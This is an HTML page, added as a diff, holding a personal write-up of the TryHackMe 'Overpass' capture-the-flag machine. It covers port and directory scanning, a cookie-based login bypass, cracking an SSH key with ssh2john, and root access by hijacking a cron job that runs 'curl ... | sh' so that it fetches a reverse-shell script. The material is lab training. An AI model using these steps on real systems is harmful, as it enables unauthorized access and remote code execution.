@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="tr">
+  <head>
+    <link href="/imgs/favicon.ico" rel="icon" type="image/x-icon">
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>CTFs</title>
+    <style>
+      :root {
+        --bg: #0b0f12;
+        --accent: #76e6a8;
+        --muted: #9aa7b2;
+        --mono: "SFMono-Regular", ui-monospace, Menlo, Monaco, "Roboto Mono",
+          "Courier New", monospace;
+      }
+      html,
+      body {
+        margin: 0;
+        height: 100%;
+        background: var(--bg);
+        color: var(--muted);
+        font-family: var(--mono);
+      }
+      .terminal {
+        display: flex;
+        flex-direction: column;
+        height: 70%;
+        border-radius: 8px;
+        overflow: hidden;
+        max-width: 1000px;
+        margin: auto;
+        background: #05080b;
+        box-shadow: 0 0 20px rgba(0, 0, 0, 0.6);
+      }
+      .term-head {
+        display: flex;
+        align-items: center;
+        padding: 5px;
+        background: #0f1418;
+      }
+      .dot {
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+        margin-right: 6px;
+      }
+      .red {
+        background: #ff5f56;
+      }
+      .yellow {
+        background: #ffbd2e;
+      }
+      .green {
+        background: #27c93f;
+      }
+      .title {
+        margin-left: 8px;
+        color: var(--muted);
+        font-size: 14px;
+      }
+      .term-body {
+        flex: 1;
+        overflow-y: auto;
+        padding: 10px;
+        white-space: pre-wrap;
+        line-height: 1.5;
+      }
+      .term-body::-webkit-scrollbar {
+        width: 10px;
+      }
+      .term-body::-webkit-scrollbar-thumb {
+        background: var(--accent);
+        border-radius: 3px;
+      }
+      .cmd {
+        color: var(--accent);
+      }
+    </style>
+  </head>
+  <body>
+    <br /><br /><br />
+    <div class="terminal">
+      <div class="term-head">
+        <div class="dot red"></div>
+        <div class="dot yellow"></div>
+        <div class="dot green"></div>
+        <div class="title">yavuzkanat@terminal:~$</div>
+      </div>
+      <div class="term-body" contenteditable="false">
+        $ <span class="cmd">cat Overpass.txt</span>
+        <h1>Overpass (THM)</h1>
+        <h5 class="cmd">Network Scan</h5>
+        <p>
+          First things first, I want to take a look at open ports on the
+          machine.
+        </p>
+        <img src="/imgs/overpass/2.png" alt="nmap" style="width: 80%" />
+        <p>
+          There are two open ports on the machine. And there is no valuable
+          information. And I have decided to scan the website.
+        </p>
+        <h5 class="cmd">Web Directory Scan</h5>
+        <img src="/imgs/overpass/4.png" alt="dir" style="width: 80%" />
+        <p>
+          That's a BİNGO! I've found the /admin directory. And when I did look
+          at the page source and I noticed there is login.js. When I did take a
+          look, I've found a login bypass vulnerability.
+        </p>
+        <h5 class="cmd">Login Bypass</h5>
+        <img src="/imgs/overpass/6.png" alt="LoginBypass" style="width: 80%" />
+        <p>
+          The vulnerability allows for login bypass by creating a cookie
+          "SessionToken". After that, when I get the /admin page. I am
+          encountering the id_rsa key and the name james on the page. I am using
+          ssh2john, crack the phrase for the id_rsa. And I login to SSH with the
+          username james.
+        </p>
+        <h5 class="cmd">ID_RSA & SSH Login</h5>
+        <img src="/imgs/overpass/8.png" alt="id_rsa" style="width: 80%" />
+        <p class="cmd" style="padding-left: 160px">
+          ssh james@machineIP -i id_rsa
+        </p>
+        <h5 class="cmd">Privilege Escalation</h5>
+        <p>
+          And I find the user txt. And now we have to perform privilege
+          escalation to reach root flag. Firstly, I am trying to look at sudo
+          -l, but it does not seem like there is any significant. But when I
+          looking into /etc/crontab I found a job.
+          <i class="cmd">curl overpass.thm/downloads/src/buildscript.sh | sh</i>
+          And we'll use this. And I decided to pretend like be overpassthm.
+        </p>
+        <img src="/imgs/overpass/3.png" alt="fake" style="width: 80%" />
+        <p>
+          And I created the same directory in my local machine. I create a
+          buildscriptsh that has reverse shell. I did edit /etc/hosts file to
+          make successful connection. And I start to listen to the connection.
+        </p>
+        <img src="/imgs/overpass/7.png" alt="build" style="width: 80%" />
+        <img src="/imgs/overpass/5.png" alt="conn" style="width: 80%" />
+        <img src="/imgs/overpass/9.png" alt="root" style="width: 80%;"/>
+        <h4 class="cmd" style="padding-left: 300px;">4nd I C4ptur3 Th3 R00t Fl4g !!!</h4>
+      </div>
+    </div>
+  </body>
+</html>
